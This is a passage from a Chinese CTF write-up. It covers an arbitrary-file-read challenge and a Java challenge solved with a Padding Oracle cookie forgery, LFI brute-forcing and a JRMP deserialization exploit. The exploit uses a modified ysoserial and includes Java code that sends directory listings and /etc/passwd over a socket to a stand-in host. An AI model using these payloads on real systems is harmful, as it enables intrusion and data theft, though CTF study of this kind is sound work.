尝试读取，可以发现：
此时证实了我们的猜想。然后根据flask_script项目的目录结构，进而读取app。
然后一环接一环，依次读出了下面三个。
> /home/dc2-user/ctf_web_2/app/ **init**.py  
>  /home/dc2-user/ctf_web_2/app/main/ **init**.py  
>  /home/dc2-user/ctf_web_2/app/main/views.py
在main/views.py中，我们可以看到一个hint。
猜测是通过curl可以从数据库中读到flag...
奈何自己比较菜，看到数据库遍想起来好像有个文件，是在手动修改数据库时，会留log。
对，没错，就是.mysql_history。此时尝试用户目录，root目录，最终在root目录读到flag
> /root/.mysql_history
### [390pt] 再来1杯Java
p.s.压轴题哈，说实话，这题真的学会了不少东西。毕竟自己太菜了，虽然本科专业为java开发狗。但我真的不太熟啊...
一共分为三关吧。
首先是一个PadOracle攻击，伪造cookie。这个解密Cookie可以看到hint： PadOracle:iv/cbc。
第二关，读文件，看到后端代码后，才发现，这里贼坑。
第三关，反序列化。
首先第一关好说，其实在/api/account_info这个接口，就可以拿到返回的明文信息。然后通过Padding Oracle +
cbc翻转来伪造cookie即可。在这里就不多说了。网上很多资料。
最后拿到cookie，直接浏览器写入cookie就OK。然后可以获取到一个下载文件的接口。
> /api/fileDownload?fileName=1.txt
虽然说是一个任意文件读取的接口，但是贼坑、
一顿操作猛如虎，最后只读出/etc/passwd...
搜到了[很多字典](https://github.com/tdifg/payloads/blob/master/lfi.txt)。然后burp爆破一波，最后发现/proc/self/fd/15这里有东西，看到熟悉的pk头，情不自禁的笑了起来。（对，就是源码）
源码也不多，很容易，可以看到一个反序列化的接口。
在反序列化之前，还调用了SerialKiller，作为一个waf，对常见payload进行拦截。
首先题目给了hint：JRMP。根据这个hint，我们可以找到很多资料。在这里自己用的ysoserial，根据他的JRMP模块来进行下一步操作。
在这里，JRMP主要起了一个绕过waf的功能，因为这个waf只在反序列化userinfo时进行了调用。当通过JRMP来读取payload进行反序列化时，不会走waf。
首先，JRMP这个payload被waf掉了，我们可以采用先知上的一种绕过方式。
> 
直接修改ysoserial源码即可，将原有的JRMPClient的payload复制一份，改名为JRMPClient2，然后保存并编译。
此时我们可以尝试使用URLDNS模块，来判断是否攻击成功。
    # 修改替换{{内容}}
    # 开启监听端口
    # 建议采用ceye的dnslog查看
    java -cp ./ysoserial-5am3.jar ysoserial.exploit.JRMPListener {{port}} URLDNS {{http://eval.com}}
    # 生成链接JRMPListener的payload
    # ip端口那里填写运行第4行脚本的主机地址端口
    java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8119}} | base64
    # 此时将第10行生成的代码，直接打到远程即可。
然后查看dnslog信息。发现存在，那就是ok了。
接下来可以尝试换payload了。此时这里还存在一个问题。服务器端无法执行命令！！
这个是hint中给的，所以我们需要找另一种方式，如：代码执行。
查阅资料，发现ysoserial预留了这块的接口，修改即可。
> 
然后我们尝试去修改ysoserial/payloads/util/Gadgets.java中createTemplatesImpl方法如下：
    // createTemplatesImpl修改版，支持代码执行
    public static  T createTemplatesImpl ( final String command, Class tplClass, Class abstTranslet, Class transFactory )
                throws Exception {
            final T templates = tplClass.newInstance();
            // use template gadget class
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
            pool.insertClassPath(new ClassClassPath(abstTranslet));
            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
            // run command in static initializer
            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
    //        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
    //            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
    //            "\");";
            String cmd="";
            //如果以code:开头，认为是代码，否则认为是命令
            if(!command.startsWith("code:")){
                cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
            }
            else{
                System.err.println("Java Code Mode:"+command.substring(5));//使用stderr输出，防止影响payload的输出
                cmd = command.substring(5);
            }
            clazz.makeClassInitializer().insertAfter(cmd);
            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
            clazz.setName("ysoserial.Pwner" + System.nanoTime());
            CtClass superC = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superC);
            final byte[] classBytes = clazz.toBytecode();
            // inject class bytes into instance
            Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Foo.class)
            });
            // required to make TemplatesImpl happy
            Reflections.setFieldValue(templates, "_name", "Pwnr");
            Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
            return templates;
        }
此时，我们的payload已经可以支持代码执行了。
在这里，我是直接用本地的题目环境进行调试，尝试打印了aaa,操作如下。
    # 修改替换{{内容}}
    # 开启监听端口
    # 建议采用ceye的dnslog查看
    # 执行时合并为一行，为了好看，我换了下行
    java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 
        CommonsBeanutils1 'code:System.out.printld("aaa");'
    # 生成链接JRMPListener的payload
    # ip端口那里填写运行第4行脚本的主机地址端口
    java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64
    # 此时将第10行生成的代码，直接打到远程即可。
然后进而写一下获取文件，以及获取目录的代码。此时拿到文件，无法回显。我们可以用Socket来将文件发送到我们的服务器，然后nc监听端口即可。
    // 以下代码使用时，记得压缩到一行。
    // 获取目录下内容
    java.io.File file  =new java.io.File("/");
    java.io.File[] fileLists = file.listFiles();
    java.net.Socket s = new java.net.Socket("eval.com",8768);
    for (int i = 0; i < fileLists.length; i++) {
      java.io.OutputStream out = s.getOutputStream();
      out.write(fileLists[i].getName().getBytes());
      out.write("\n".getBytes());
    }
    // 获取文件内容
    java.io.File file = new java.io.File("/etc/passwd");
    java.io.InputStream in = null;
    in = new java.io.FileInputStream(file);
    int tempbyte;
    java.net.Socket s = new java.net.Socket("eval.com",8768);
    while ((tempbyte = in.read()) != -1) {
      java.io.OutputStream out = s.getOutputStream();
      out.write(tempbyte);
    }
    in.close();
    s.close();
然后操作如下：
    # 修改替换{{内容}}
    # 开启监听端口
    # 建议采用ceye的dnslog查看
    # 执行时合并为一行，为了好看，我换了下行
    java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 
        CommonsBeanutils1 'code:{{javapayload}}'
    # 生成链接JRMPListener的payload
    # ip端口那里填写运行第4行脚本的主机地址端口
    java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64
    # 监听端口数据
    nc -lnvp 2333
    # 此时将第10行生成的代码，直接打到远程即可。
p.s. /flag是个文件夹